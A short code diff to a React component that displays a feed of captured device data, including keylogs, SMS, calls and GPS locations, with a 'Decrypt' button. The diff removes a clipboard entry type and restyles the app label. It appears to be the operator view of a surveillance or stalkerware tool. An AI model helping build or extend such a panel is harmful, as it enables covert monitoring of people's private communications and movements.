@@ -10,7 +10,6 @@ interface TelemetryFeedProps {
 const TYPE_META: Record<TelemetryEntry['type'], { badge: string; color: string; bg: string; icon: string }> = {
   NOTIFICATION: { badge: 'NOTIF', color: '#60a5fa', bg: 'rgba(59,130,246,0.12)',  icon: '🔔' },
   KEYLOG:       { badge: 'KEYS',  color: '#f87171', bg: 'rgba(239,68,68,0.12)',   icon: '⌨' },
-  CLIPBOARD:    { badge: 'CLIP',  color: '#fbbf24', bg: 'rgba(245,158,11,0.12)',  icon: '📋' },
   SMS:          { badge: 'SMS',   color: '#4ade80', bg: 'rgba(34,197,94,0.12)',   icon: '✉' },
   CALL:         { badge: 'CALL',  color: '#c084fc', bg: 'rgba(168,85,247,0.12)', icon: '📞' },
   LOCATION:     { badge: 'GPS',   color: '#22d3ee', bg: 'rgba(6,182,212,0.12)',  icon: '📍' },
@@ -51,7 +50,11 @@ function LogRow({ log, index }: { log: TelemetryEntry; index: number }) {
           <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4, padding: '2px 8px', borderRadius: 4, background: meta.bg, color: meta.color, border: `1px solid ${meta.color}44`, fontSize: 10, fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
             {meta.badge}
           </span>
-          {log.app && <span style={{ fontSize: 10, color: '#475569', fontFamily: 'monospace' }}>{log.app}</span>}
+          {log.app && (
+            <span style={{ fontSize: 11, fontWeight: 600, color: '#64748b', display: 'flex', alignItems: 'center', gap: 4 }}>
+              <span style={{ color: '#334155' }}>•</span> {log.app}
+            </span>
+          )}
           <span style={{ fontSize: 10, color: '#334155', marginLeft: 'auto' }}>{timeAgo(log.timestamp)}</span>
           {!decrypted && (
             <button onClick={handleDecrypt} style={{ fontSize: 10, color: '#3b82f6', background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>Decrypt ↓</button>
